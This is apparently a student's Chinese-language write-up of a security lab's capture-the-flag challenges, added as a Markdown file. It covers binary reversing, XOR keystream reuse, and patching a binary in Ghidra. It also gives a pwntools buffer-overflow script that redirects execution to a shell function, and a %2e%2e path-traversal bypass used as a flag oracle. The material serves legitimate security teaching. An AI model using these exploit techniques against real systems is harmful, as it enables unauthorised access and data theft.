@@ -1,0 +1,86 @@
+# 電腦攻防 lab_2
+
+[TOC]
+## adder
+執行檔案需要輸入3個數，會告訴你對或錯，拉進ghidra看，找main會發現後面會比較3個var相加是否等於0x539-->1337
+![](https://i.imgur.com/kr5DJzX.png)
+![](https://i.imgur.com/7k0ESQO.png)
+
+## easyStrings
+按照題目提示直接strings檔案，可以看到內容有一段特別的字串，很像base64/32之類的encode，拿去線上decode
+![](https://i.imgur.com/GprtHZL.png)
+![](https://i.imgur.com/4V7kIu5.png)
+
+
+## to bf or not to bf
+* 程式流程會分別讀取flag.png\golem.png，會用2維陣列方式去表示，送到encrypt()加密，最後送出flag_enc.png\golem_enc.png 加密圖
+* encrypt()中seed最後會合成一個字串，把random.seed(seed)，random順序會被固定random.randint(0,255) 會是一個固定內容的 List，加密方式是把陣列每格都跟固定內容的List做 XOR，因為沒有重新選 fire, water, earth, air，所以2張圖是用一樣的random.randint(0,255) 做加密
+    * 原圖Ａ xor token --> 加密A圖
+    * 原圖Ｂ xor token --> 加密Ｂ圖
+    * 加密A圖 xor 加密Ｂ圖 = 原圖Ａ xor token xor 原圖Ｂ xor token  = 原圖Ａ xor 原圖Ｂ 
+* 把2張加密圖做 xor 得到 原圖Ａ xor 原圖Ｂ，得到帶有flag.png 的圖片
+```python=1
+# decrypt
+pic1 = cv2.imread('golem_enc.png',cv2.IMREAD_GRAYSCALE)
+pic2 = cv2.imread('flag_enc.png',cv2.IMREAD_GRAYSCALE)
+XorPic = cv2.imread('flag_enc.png',cv2.IMREAD_GRAYSCALE)
+h, w = pic1.shape
+for i in range(h):
+    for j in range(w):    
+        XorPic[i][j] = pic1[i][j] ^ pic2[i][j]
+
+cv2.imwrite("XorPic.png", XorPic)  
+```
+![](https://i.imgur.com/evzbKRV.png)
+
+
+## XAYB
+* 用 ubuntu 執行程式會有一個類似1A2B的猜數字遊戲，直接丟到Ghidra看一下，會是一個elf檔案
+* 找main function -> 發現main() 會call 一個 game_logic 函式，再往裡面看
+* game_logic 可以看到 "Enter something to start this game..."); "You have %d chances to guess the answer. I\'m so kind :)\n") 跟一開始直接執行時 看到相同的字串輸出，game_logic流程大略是判斷輸入是否 與答案相符，後面有一個 if 條件判斷變數是否等於5 -->puts("BINGO!"); 把流程改成 !=5 進入if， 匯出檔案(注意選elf檔)，在執行一次 隨便猜不要剛好全對 就能進入if， 回傳 flag
+![](https://i.imgur.com/H66aczC.jpg)
+![](https://i.imgur.com/zfYvnat.jpg)
+
+
+##  Arch Check
+* 老師有提示要用BOF，所以先丟進Ghidra看一下，找main() 看到有一段  Sub RSP 0x20 得知stack給了20空間
+* 一開始: 發現main() 上面那個函式 debug() 會做call shell，想把stack一路塞回到上面執行debug()，在debug() 有 Sub RSP 0x8知道又開了 8個空間，因為 main() debug() 記憶體位置是相鄰的 所以覺得上一個用stack 就是debug() 我想可以一直往回塞 回到debug()， main()塞40個char， debug()塞16個char，因此我就直接回56個"A" **結果不行**
+* 另一個想法: 塞40個char 確定可以在 main()循環，因此這邊的return 因該是回到main()，想辦法讓他return 到 debug()
+    1. 用 python3 -c print("A"*40 + "AAA") | ./arch_check2輸入字串  
+    2. dmesg tail 查看 錯誤/register值發現 40個char後 多打的AAA會溢回 RIP，所以可以在"A"*40 後接debug()的位置
+    3. 用 Ghidra看debug()位置在0x004011dd 用 python3 -c print("A"*40 + \xdd\x11@\x00\x00\x00\x00\x00) | ./arch_check2  發現\xdd 會怪怪的 不能轉成 dd
+    4. 最後用pwntools 送b"A"*40 + bb'\xdd\x11@\x00\x00\x00\x00\x00' --> **成功**
+
+![](https://i.imgur.com/vPP5poG.jpg)
+![](https://i.imgur.com/d1ccH5g.jpg)
+```python=1
+from pwn import *
+conn = remote('up.zoolab.org',30001)
+conn.recvline() 
+conn.recvline()
+conn.sendline(b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'+b'\xdd\x11@\x00\x00\x00\x00\x00\r\n')
+x = conn.recvline()
+conn.interactive() 
+```
+![](https://i.imgur.com/O63aKJq.png)
+
+
+##  text2emoji
+* 看source code，發現在text打的資訊會用POST方式存放在前端的text
+    * const text = request.body.text.toString
+* 前端的url = "http://127.0.0.1:7414/api/v1/emoji/${text}" 會加上剛剛輸入的字串
+* 後端的部分 只要在apiRouter.use('/emoji/:text' 部分因該就不會有flag，要想辦法讓後端跳到 apiRouter.use('/looksLikeFlag' 一開始嘗試輸入 ..跳回上一個目錄但 .. 會被 'Bad parameter' 檔下來，用%2e%2e url encoding方式繞過，用%2e%2e/looksLikeFlag 發現沒噴錯搭配F12看 response
+* (與他人討論) FLAG.match(/^FLAG{[a-z0-9_]+}$/) 表示了FLAG 的組成是 a-z0-9_
+
+> res.send({ looksLikeFlag: FLAG.includes(req.query.flag) }); 
+* looksLikeFlag 是response變數用F12看 會裝T/F，  req.query是 GET method，用來拿flag query，所以可以用 flag=??? ，以GET method去送， FLAG.includes看 FLAG 字串中是否有包含 flag=??? 的內容，最後回傳 T/F， 可以藉由POST flag=??? 查看F12中 { looksLikeFlag: true/false} 得知目前 flag=??? 有沒有包含在 FLAG中
+
+* 整合:
+    1. %2e%2e/looksLikeFlag 後端跳到\looksLikeFlag 執行
+    2. 用 flag=??? 看F12 public_api 中的 looksLikeFlag結果，看flag=??? 是否有包含在FLAG中
+    3. 用python requests 去送POST， 試出 flag結果
+![](https://i.imgur.com/N2AdnoN.png)
+![](https://i.imgur.com/iG5cAUC.png)
+
+
+hackmd: https://hackmd.io/-ii-EE_PRky3RXZ_-TpAuw
